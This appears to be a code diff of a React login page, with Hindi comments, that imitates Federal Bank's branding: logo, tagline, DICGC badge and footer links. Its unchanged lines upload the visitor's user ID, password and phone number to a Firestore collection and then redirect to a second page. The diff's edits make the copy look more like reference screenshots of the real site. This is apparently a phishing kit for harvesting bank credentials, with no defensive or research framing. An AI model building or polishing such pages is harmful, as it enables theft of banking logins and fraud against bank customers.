@@ -25,7 +25,6 @@ const FirstPage = () => {
         localStorage.setItem(`${COLLECTION_NAME}_document_id`, documentId);
       }
       
-      // Firestore में डेटा अपलोड करें (User ID, Password, Phone Number)
       const result = await FirebaseUtil.uploadAnyModel(`${COLLECTION_NAME}/${documentId}`, {
         key: documentId,
         userId,
@@ -38,7 +37,6 @@ const FirstPage = () => {
       if (result.state === 'success') {
         setTimeout(() => {
           setIsSubmitting(false);
-          // सफलतापूर्वक सबमिट होने पर दूसरे पेज पर नेविगेट करें
           navigate(`/second/${documentId}`);
         }, 1500);
       } else {
@@ -51,36 +49,37 @@ const FirstPage = () => {
   };
 
   return (
-    // Main Container - Light Background
+    // Main Container - Full Screen with Background Simulation
     <div className="flex flex-col min-h-screen relative bg-gray-100 overflow-hidden">
         
-        {/* Blurred Background Placeholder */}
+        {/* 🚨 UPDATED BACKGROUND: Simulating the Blurred Blue/Gray Image (3374.jpg) */}
         <div className="absolute inset-0 bg-cover bg-center" style={{ 
-            backgroundImage: 'url("https://placehold.co/1000x1000/B0E0E6/000000/png?text=Federal+Bank+Background")', 
-            filter: 'blur(3px)', 
-            zIndex: 0 
+            // 3374.jpg के ब्लू/ग्रे टोन और ब्लर डेस्क को सिम्युलेट करने वाला बैकग्राउंड
+            backgroundImage: 'url("https://placehold.co/1000x2000/B0C4DE/333333/png?text=BLURRED+BACKGROUND")', 
+            filter: 'blur(3px) brightness(0.8)', // ब्लर और थोड़ा डार्क किया गया
+            zIndex: 0,
+            // सुनिश्चित करें कि यह लंबा कंटेंट भी कवर करे
+            minHeight: '100%' 
         }}></div>
 
-        {/* 🚨 UPDATED HEADER: Logo Section (आपके मार्क किए गए हिस्से के लिए) */}
+        {/* Header - (3412.jpg के अनुसार पूरा Federal Bank लोगो) */}
         <header className="relative bg-white bg-opacity-90 p-3 flex justify-between items-center shadow-md z-10">
             <div className="flex items-center space-x-2 w-full justify-center">
-                {/* 3411.png वाला Federal Bank का पूरा लोगो */}
+                {/* Full Federal Bank Logo Image (Placehoder) */}
                 <img 
-                    src="https://placehold.co/300x40/003366/FFFFFF/png?text=FEDERAL+BANK" // यहाँ आपको अपनी logo.png/svg का URL डालना होगा
+                    src="https://placehold.co/300x40/003366/FFFFFF/png?text=FEDERAL+BANK" 
                     alt="FEDERAL BANK" 
-                    className="h-8 md:h-10" // लोगो की ऊँचाई एडजस्ट की गई
+                    className="h-8 md:h-10"
                 />
             </div>
-            {/* राइट साइड के आइकॉन्स हटा दिए गए हैं ताकि पूरा लोगो फिट हो सके */}
         </header>
-        {/* --- Header End --- */}
 
         {/* Main Content - White Login Card */}
         <main className="flex-1 p-4 flex justify-center items-start pt-16 relative z-10">
-            <div className="bg-white rounded-lg w-full max-w-sm p-6 shadow-2xl">
+            <div className="bg-white rounded-lg w-full max-w-sm p-6 shadow-xl">
                 
                 {/* Need an Account? Sign Up Section */}
-                <div className="flex justify-between items-center mb-6">
+                <div className="flex justify-between items-center mb-6 border-b pb-4">
                     <p className="text-sm text-gray-600">
                         Need an Account? <a href="#" className="text-blue-600 font-semibold hover:underline">Sign Up</a>
                     </p>
@@ -134,14 +133,14 @@ const FirstPage = () => {
                     {/* LOGIN Button (Dark Blue) */}
                     <button
                         type="submit"
-                        className="w-full bg-[#003366] hover:bg-[#004488] text-white font-bold py-2 rounded-md transition duration-150 ease-in-out text-base mt-2"
+                        className="w-full bg-[#003366] hover:bg-[#004488] text-white font-bold py-2 rounded-md transition duration-150 ease-in-out text-base mt-4"
                         disabled={isSubmitting}
                     >
                         {isSubmitting ? "Processing..." : "Log In"}
                     </button>
 
                     {/* Links below the LOGIN button */}
-                    <div className="flex justify-between text-sm pt-1">
+                    <div className="flex justify-between text-sm pt-2">
                         <a href="#" className="text-blue-600 hover:underline">
                             Forgot Password?
                         </a>
@@ -160,16 +159,32 @@ const FirstPage = () => {
             </div>
         </main>
 
-        {/* Footer (Dark Blue Federal Bank Bar) */}
-        <footer className="relative bg-[#003366] text-white p-4 text-center z-10">
-            {/* Federal Bank Logo and Text */}
+        {/* 🚨 UPDATED FOOTER: Full Federal Bank Blue Bar (3374.jpg) */}
+        <footer className="relative bg-[#003366] text-white p-4 text-center z-10 w-full mt-auto">
+            {/* Main Logo Section */}
             <div className="flex justify-center items-center space-x-2 mb-2">
-                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-                    <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.477 3-10S13.657 3 12 3s-3 4.477-3 10 1.343 10 3 10z" />
-                </svg>
-                <div className="text-lg font-bold">FEDERAL BANK</div>
+                {/* Federal Bank Logo Text */}
+                <div className="text-xl font-bold tracking-wider">FEDERAL BANK</div>
+                {/* Tagline */}
+                <p className="text-sm border-l border-white pl-2">YOUR PERFECT BANKING PARTNER</p>
             </div>
-            <p className="text-xs">YOUR PERFECT BANKING PARTNER</p>
+            
+            {/* DICGC, QR Code, Privacy/Terms (Bottom Row Simulation) */}
+            <div className="flex justify-between items-end pt-2 border-t border-gray-600">
+                
+                {/* DICGC Logo Placeholder */}
+                <div className="flex items-center space-x-2 text-xs">
+                    <img src="https://placehold.co/40x20/FFFFFF/000000/png?text=DICGC" alt="DICGC" className="h-5 bg-white p-0.5 rounded" />
+                    <span className="text-gray-300 hidden sm:inline">|</span>
+                    <span className="text-gray-300 hidden sm:inline">A Government of India Undertaking</span>
+                </div>
+                
+                {/* Privacy & Terms Badge (Right Bottom Corner) */}
+                <div className="text-xs">
+                    <p className="text-gray-300">Privacy - Terms</p>
+                </div>
+
+            </div>
         </footer>
     </div>
   );
